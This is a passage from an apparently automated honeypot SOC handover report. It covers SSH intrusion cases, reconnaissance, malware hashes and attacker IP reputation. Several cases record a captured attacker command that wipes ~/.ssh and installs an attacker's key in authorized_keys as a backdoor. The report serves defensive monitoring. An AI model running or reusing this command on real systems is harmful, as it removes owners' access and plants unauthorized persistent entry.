**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:28:14` | `cowrie.session.connect` |
| `2026-06-12 22:28:14` | `cowrie.client.version` |
| `2026-06-12 22:28:15` | `cowrie.client.kex` |
| `2026-06-12 22:28:15` | `cowrie.login.success` |
| `2026-06-12 22:28:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.190[.]64` to AbuseIPDB if not already reported
- [ ] Block `43.164.190[.]64` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e814bb5db2e

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 22:30 |
| **Last Seen** | 2026-06-12 22:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:30:11` | `cowrie.session.connect` |
| `2026-06-12 22:30:11` | `cowrie.client.version` |
| `2026-06-12 22:30:11` | `cowrie.client.kex` |
| `2026-06-12 22:30:12` | `cowrie.login.success` |
| `2026-06-12 22:30:13` | `cowrie.session.params` |
| `2026-06-12 22:30:13` | `cowrie.command.input` |
| `2026-06-12 22:30:13` | `cowrie.command.failed` |
| `2026-06-12 22:30:13` | `cowrie.log.closed` |
| `2026-06-12 22:30:14` | `cowrie.session.params` |
| `2026-06-12 22:30:14` | `cowrie.command.input` |
| `2026-06-12 22:30:14` | `cowrie.session.file_download` |
| `2026-06-12 22:30:14` | `cowrie.log.closed` |
| `2026-06-12 22:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dac767ecad9c

| Field | Detail |
|---|---|
| **Source IP** | `104.244.74[.]84` |
| **First Seen** | 2026-06-12 22:30 |
| **Last Seen** | 2026-06-12 22:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:30:16` | `cowrie.session.connect` |
| `2026-06-12 22:30:16` | `cowrie.client.version` |
| `2026-06-12 22:30:17` | `cowrie.client.kex` |
| `2026-06-12 22:30:17` | `cowrie.login.success` |
| `2026-06-12 22:30:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.244.74[.]84` to AbuseIPDB if not already reported
- [ ] Block `104.244.74[.]84` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31ad4ddb1d30

| Field | Detail |
|---|---|
| **Source IP** | `14.29.227[.]118` |
| **First Seen** | 2026-06-12 22:40 |
| **Last Seen** | 2026-06-12 22:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:40:05` | `cowrie.session.connect` |
| `2026-06-12 22:40:05` | `cowrie.client.version` |
| `2026-06-12 22:40:05` | `cowrie.client.kex` |
| `2026-06-12 22:40:06` | `cowrie.login.success` |
| `2026-06-12 22:40:06` | `cowrie.session.params` |
| `2026-06-12 22:40:06` | `cowrie.command.input` |
| `2026-06-12 22:40:06` | `cowrie.command.failed` |
| `2026-06-12 22:40:06` | `cowrie.log.closed` |
| `2026-06-12 22:40:06` | `cowrie.session.params` |
| `2026-06-12 22:40:06` | `cowrie.command.input` |
| `2026-06-12 22:40:06` | `cowrie.session.file_download` |
| `2026-06-12 22:40:06` | `cowrie.log.closed` |
| `2026-06-12 22:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.227[.]118` to AbuseIPDB if not already reported
- [ ] Block `14.29.227[.]118` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-117e65d9ba32

| Field | Detail |
|---|---|
| **Source IP** | `14.29.227[.]118` |
| **First Seen** | 2026-06-12 22:40 |
| **Last Seen** | 2026-06-12 22:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 22:40:09` | `cowrie.session.connect` |
| `2026-06-12 22:40:10` | `cowrie.client.version` |
| `2026-06-12 22:40:10` | `cowrie.client.kex` |
| `2026-06-12 22:40:10` | `cowrie.login.success` |
| `2026-06-12 22:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.227[.]118` to AbuseIPDB if not already reported
- [ ] Block `14.29.227[.]118` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4300dbc81eaa

| Field | Detail |
|---|---|
| **Source IP** | `177.60.125[.]141` |
| **First Seen** | 2026-06-12 23:18 |
| **Last Seen** | 2026-06-12 23:18 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 23:18:35` | `cowrie.session.connect` |
| `2026-06-12 23:18:35` | `cowrie.client.version` |
| `2026-06-12 23:18:35` | `cowrie.client.kex` |
| `2026-06-12 23:18:37` | `cowrie.login.success` |
| `2026-06-12 23:18:37` | `cowrie.session.params` |
| `2026-06-12 23:18:37` | `cowrie.command.input` |
| `2026-06-12 23:18:37` | `cowrie.command.failed` |
| `2026-06-12 23:18:38` | `cowrie.log.closed` |
| `2026-06-12 23:18:38` | `cowrie.session.params` |
| `2026-06-12 23:18:38` | `cowrie.command.input` |
| `2026-06-12 23:18:39` | `cowrie.session.file_download` |
| `2026-06-12 23:18:39` | `cowrie.log.closed` |
| `2026-06-12 23:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.60.125[.]141` to AbuseIPDB if not already reported
- [ ] Block `177.60.125[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67ba0b4e88f5

| Field | Detail |
|---|---|
| **Source IP** | `177.60.125[.]141` |
| **First Seen** | 2026-06-12 23:18 |
| **Last Seen** | 2026-06-12 23:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-12 23:18:42` | `cowrie.session.connect` |
| `2026-06-12 23:18:42` | `cowrie.client.version` |
| `2026-06-12 23:18:43` | `cowrie.client.kex` |
| `2026-06-12 23:18:44` | `cowrie.login.success` |
| `2026-06-12 23:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.60.125[.]141` to AbuseIPDB if not already reported
- [ ] Block `177.60.125[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `104.244.74[.]84` | **21** | 2026-06-12 21:51 | 2026-06-12 22:30 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.164.191[.]60` | **20** | 2026-06-12 22:26 | 2026-06-12 23:11 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `57.134.215[.]133` | **20** | 2026-06-12 22:23 | 2026-06-12 23:05 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.248.83[.]33` | **4** | 2026-06-12 21:51 | 2026-06-12 21:58 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `60.251.50[.]148` | **3** | 2026-06-12 21:57 | 2026-06-12 22:02 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `139.84.243[.]79` | **2** | 2026-06-12 22:05 | 2026-06-12 22:07 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `103.161.170[.]12` | 1 | 2026-06-12 23:16 | 2026-06-12 23:16 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.174.80[.]40` | 1 | 2026-06-12 23:07 | 2026-06-12 23:07 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.69[.]159` | 1 | 2026-06-12 23:18 | 2026-06-12 23:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `125.133.16[.]14` | 1 | 2026-06-12 22:56 | 2026-06-12 22:57 | 12s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]172` | 1 | 2026-06-12 22:22 | 2026-06-12 22:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.29.227[.]118` | 1 | 2026-06-12 22:40 | 2026-06-12 22:40 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `150.139.201[.]247` | 1 | 2026-06-12 23:13 | 2026-06-12 23:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.32.239[.]90` | 1 | 2026-06-12 21:51 | 2026-06-12 21:51 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `175.178.58[.]190` | 1 | 2026-06-12 21:58 | 2026-06-12 22:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `177.60.125[.]141` | 1 | 2026-06-12 23:18 | 2026-06-12 23:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `194.187.176[.]119` | 1 | 2026-06-12 22:31 | 2026-06-12 22:31 | 4s | 0 | `T1592` | 🟢 LOW |
| `43.164.190[.]64` | 1 | 2026-06-12 22:28 | 2026-06-12 22:28 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.89.63[.]39` | 1 | 2026-06-12 23:11 | 2026-06-12 23:11 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `48.214.54[.]57` | 1 | 2026-06-12 23:20 | 2026-06-12 23:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.217.255[.]171` | 1 | 2026-06-12 22:09 | 2026-06-12 22:09 | 11s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-06-12 22:05 | 2026-06-12 22:05 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (35 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a2f3d6d2bd82a65939f4e939bce242e8e246014fb3a9a9d5c3769ed7dcfffe24` | Unknown binary | `a2f3d6d2bd82a659...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `fc6f8ae5f64e4f17481f7e3be29a1c56949f216a998414188003eae1db20c9e5` | GZip Archive | `fc6f8ae5f64e4f17...` | 14/100 | 🟢 LOW | **35/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **49/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `125.133.16[.]14` | KR | Korea Telecom | **100** ⚠️ | 2 |
| `103.174.80[.]40` | IN | Pioneer Elabs Ltd. | **100** ⚠️ | 42 |
| `50.217.255[.]171` | US | Comcast Cable Communications, LLC | **100** ⚠️ | 50 |
| `194.187.176[.]119` | DE | Alpha Strike Labs GmbH | **100** ⚠️ | 18 |
| `60.251.50[.]148` | TW | Chunghwa Telecom Data Communication Business Group | **100** ⚠️ | 0 |
| `177.60.125[.]141` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 0 |
| `139.84.243[.]79` | ZA | The Constant Company, LLC | **100** ⚠️ | 11 |
| `45.89.63[.]39` | GB | DGTL TECH UK LLP | **100** ⚠️ | 50 |
| `152.32.239[.]90` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 50 |
| `57.134.215[.]133` | CA | Cogeco Connexion Inc. | **100** ⚠️ | 32 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 117 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 79 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 36 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 18 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 18 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 126 cases |
| Tool 34  | Credential Extractor        | ✅ 115 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 26 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (3.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 35 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 36 priority case(s) shown individually · 22 recon entry/entries in table (6 group(s) consolidating 70 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-12T23:21:34Z_
